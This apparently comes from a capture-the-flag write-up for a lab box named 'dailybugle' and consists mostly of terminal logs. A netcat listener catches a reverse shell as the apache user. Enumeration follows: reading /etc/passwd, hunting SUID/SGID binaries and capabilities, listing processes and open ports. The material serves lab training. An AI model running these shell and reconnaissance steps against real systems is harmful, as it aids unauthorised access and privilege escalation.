
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443 
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.72.202] 53862
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 15:35:26 up 36 min,  0 users,  load average: 0.00, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ ls -la
ls -la
total 16
dr-xr-xr-x.  17 root root  244 Dec 14  2019 .
dr-xr-xr-x.  17 root root  244 Dec 14  2019 ..
-rw-r--r--    1 root root    0 Dec 14  2019 .autorelabel
lrwxrwxrwx.   1 root root    7 Dec 14  2019 bin -> usr/bin
dr-xr-xr-x.   5 root root 4096 Jan 14  2020 boot
drwxr-xr-x   19 root root 2980 Jul 11 14:59 dev
drwxr-xr-x.  79 root root 8192 Jan 14  2020 etc
drwxr-xr-x.   3 root root   22 Dec 14  2019 home
lrwxrwxrwx.   1 root root    7 Dec 14  2019 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 Dec 14  2019 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   2 root root    6 Apr 11  2018 opt
dr-xr-xr-x  117 root root    0 Jul 11 14:58 proc
dr-xr-x---.   3 root root  163 Dec 15  2019 root
drwxr-xr-x   25 root root  700 Jul 11 14:59 run
lrwxrwxrwx.   1 root root    8 Dec 14  2019 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x   13 root root    0 Jul 11 14:58 sys
drwxrwxrwt    2 root root    6 Jul 11 15:19 tmp
drwxr-xr-x.  13 root root  155 Dec 14  2019 usr
drwxr-xr-x.  20 root root  278 Dec 14  2019 var
sh-4.2$ cd home
cd home
sh-4.2$ ls -la
ls -la
total 0
drwxr-xr-x.  3 root     root      22 Dec 14  2019 .
dr-xr-xr-x. 17 root     root     244 Dec 14  2019 ..
drwx------.  2 jjameson jjameson  99 Dec 15  2019 jjameson
sh-4.2$ cd jjameson
cd jjameson
sh: cd: jjameson: Permission denied
sh-4.2$ cd ..
cd ..
sh-4.2$
```

we are uid=48(apache) gid=48(apache) groups=48(apache)

the user is jjameson and his password is not the same

```sh
bash-4.2$ env
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
PWD=/
LANG=C
NOTIFY_SOCKET=/run/systemd/notify
SHLVL=3
_=/usr/bin/env

bash-4.2$ history
    1  export TERM=xterm
    2  ls -la
    3  sudo -l
    4  cat /proc/version
    5  env
    6  history
    
bash-4.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
bash-4.2$ 
```

```sh
bash-4.2$ find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x. 1 root root 73888 Aug  8  2019 /usr/bin/chage
-rwsr-xr-x. 1 root root 78408 Aug  8  2019 /usr/bin/gpasswd
-rws--x--x. 1 root root 23968 Aug  8  2019 /usr/bin/chfn
-rws--x--x. 1 root root 23880 Aug  8  2019 /usr/bin/chsh
-rwsr-xr-x. 1 root root 41936 Aug  8  2019 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 32128 Aug  8  2019 /usr/bin/su
---s--x--x. 1 root root 147320 Aug  8  2019 /usr/bin/sudo
-rwsr-xr-x. 1 root root 44264 Aug  8  2019 /usr/bin/mount
-rwsr-xr-x. 1 root root 31984 Aug  8  2019 /usr/bin/umount
-rwsr-xr-x. 1 root root 57656 Aug  8  2019 /usr/bin/crontab
-rwsr-xr-x. 1 root root 23576 Aug  8  2019 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 27856 Aug  8  2019 /usr/bin/passwd
-rwsr-xr-x. 1 root root 36280 Apr 10  2018 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 11216 Apr 10  2018 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 11296 Aug  8  2019 /usr/sbin/usernetctl
-rwsr-xr-x. 1 root root 15432 Aug  8  2019 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x---. 1 root dbus 58024 Mar 14  2019 /usr/libexec/dbus-1/dbus-daemon-launch-helper
bash-4.2$ find / -perm -g=s -type f -exec ls -la {} \; 2>/dev/null
-r-xr-sr-x. 1 root tty 15344 Jun  9  2014 /usr/bin/wall
-rwxr-sr-x. 1 root tty 19544 Aug  8  2019 /usr/bin/write
---x--s--x. 1 root nobody 382216 Aug  8  2019 /usr/bin/ssh-agent
-rwxr-sr-x. 1 root root 11224 Aug  8  2019 /usr/sbin/netreport
-rwxr-sr-x. 1 root postdrop 218632 Oct 30  2018 /usr/sbin/postdrop
-rwxr-sr-x. 1 root postdrop 260112 Oct 30  2018 /usr/sbin/postqueue
-rwx--s--x. 1 root utmp 11192 Jun  9  2014 /usr/libexec/utempter/utempter
---x--s--x. 1 root ssh_keys 465760 Aug  8  2019 /usr/libexec/openssh/ssh-keysign
bash-4.2$ crontab -l
no crontab for apache
bash-4.2$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

bash-4.2$ getcap -r / 2>/dev/null
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep

```

ps aux
```sh
root       622  0.0  0.0  55528   884 ?        S<sl 14:59   0:00 /sbin/auditd
polkitd    644  0.0  1.1 612244 12096 ?        Ssl  14:59   0:00 /usr/lib/polkit-1/polkitd --no-debug
root       647  0.0  0.1  26380  1748 ?        Ss   14:59   0:00 /usr/lib/systemd/systemd-logind
dbus       651  0.0  0.2  58240  2472 ?        Ss   14:59   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
chrony     657  0.0  0.1 120404  2016 ?        S    14:59   0:00 /usr/sbin/chronyd
root       662  0.0  0.8 474060  8164 ?        Ssl  14:59   0:00 /usr/sbin/NetworkManager --no-daemon
root       668  0.0  0.1 126288  1580 ?        Ss   14:59   0:00 /usr/sbin/crond -n
root       891  0.0  0.2 102896  2772 ?        Ss   14:59   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid -H dailybugle eth0
root       948  0.0  1.7 574200 17420 ?        Ssl  14:59   0:01 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
root       949  0.0  0.4 112920  4308 ?        Ss   14:59   0:00 /usr/sbin/sshd -D
root       961  0.0  0.6 220900  6836 ?        Ssl  14:59   0:00 /usr/sbin/rsyslogd -n
root       962  0.0  1.5 418124 15696 ?        Ss   14:59   0:01 /usr/sbin/httpd -DFOREGROUND
root       987  0.0  0.0 110108   856 tty1     Ss+  14:59   0:00 /sbin/agetty --noclear tty1 linux
root       989  0.0  0.0 110108   860 ttyS0    Ss+  14:59   0:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
mysql     1024  0.0  0.1 113316  1592 ?        Ss   14:59   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
mysql     1220  0.0  9.9 1102700 100900 ?      Sl   14:59   0:03 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
root      1393  0.0  0.2  89700  2184 ?        Ss   14:59   0:00 /usr/libexec/postfix/master -w
postfix   1411  0.0  0.4  89804  4060 ?        S    14:59   0:00 pickup -l -t unix -u
postfix   1412  0.0  0.4  89996  4256 ?        S    14:59   0:00 qmgr -l -t unix -u
```

```sh
bash-4.2$ ss -tulpn
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0         *:68                    *:*                  
udp    UNCONN     0      0      127.0.0.1:323                   *:*                  
udp    UNCONN     0      0         [::1]:323                [::]:*                  
tcp    LISTEN     0      100    127.0.0.1:25                    *:*                  
tcp    LISTEN     0      50        *:3306                  *:*                  
tcp    LISTEN     0      128       *:22                    *:*                  
tcp    LISTEN     0      100       [::1]:25                 [::]:*                  
tcp    LISTEN     0      128    [::]:80                 [::]:*                  
tcp    LISTEN     0      128    [::]:22                 [::]:*   
```

